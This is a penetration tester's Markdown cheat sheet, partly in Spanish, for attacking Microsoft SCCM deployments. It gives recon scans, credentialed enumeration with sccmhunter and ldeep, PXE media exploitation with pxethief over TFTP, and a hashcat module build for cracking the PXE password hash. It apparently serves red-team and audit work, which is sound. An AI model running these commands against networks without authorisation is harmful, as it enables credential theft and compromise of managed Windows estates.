# Microsoft System Center Configuration Manager

## Recon

### Without User

```bash
# NMAP
nmap -vvv -Pn -p 80,443,445,1433,10123,8530,8531 -sV 192.168.60.11-12 -oA sccm
sudo nmap -Pn -p 67,68,69,4011,547 -sU 192.168.60.11 -oA pxe
# SSL
openssl s_client -connect 192.168.33.11:10123
# RPCS - MIcrosoft Deployment Services Control Protocol
rpcdump.py 192.168.33.11 |grep Protocol |grep -v 'N/A'
```

### With User

- https://github.com/garrettfoster13/sccmhunter
- https://github.com/franc-pentest/ldeep

```bash
python3 sccmhunter.py find -u user -p 'pass' -d domain.com -dc-ip <DCIP> -debug
python3 sccmhunter.py show -all

ldeep ldap -u user -p 'pass' -d domain.com -s ldap://<DC IP> sccm
ldeep ldap -u user -p 'pass' -d domain.com -s ldap://<DC IP> search "(objectclass=mssmsmanagementpoint)" dnshostname,msSMSSiteCode
nxc smb <posible server> -u user -p 'pass' -d domain.com --shares
```

#### Low User

##### NTLM coercion and relay to MSSQL on remote site database

##### NTLM coercion and relay to SMB on remote site database

#### Admin User



## Exploit PXE

> Crear computadora con PXE y configurarlo como BIOS 

- install npcap (https://npcap.com/#download))
- install tftp client (windows > Turn windows feature on or off > check tftp client)
- disable your firewall (or enable tftp in it)

### Without password

```bash
python3 pxethief.py 2 <PXE SERVER>
```

### With password

```bash
tftp -i 192.168.33.11 GET "\SMSTemp\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var" "2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var"
py.exe pxethief.py 5 '.\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var'
### Cuando obtenemos la pass
py.exe pxethief.py 3 ".\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var" <password>
```

#### Crack hash

```bash
cd /workspace
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/
cd hashcat
# change to 6.2.5
git checkout -b v6.2.5 tags/v6.2.5
make
hashcat/hashcat -m 19850 --force -a 0 /workspace/pxe_hash /usr/share/wordlists/rockyou.txt
```

## Links

- https://github.com/subat0mik/Misconfiguration-Manager/
- https://www.thehacker.recipes/ad/movement/sccm-mecm
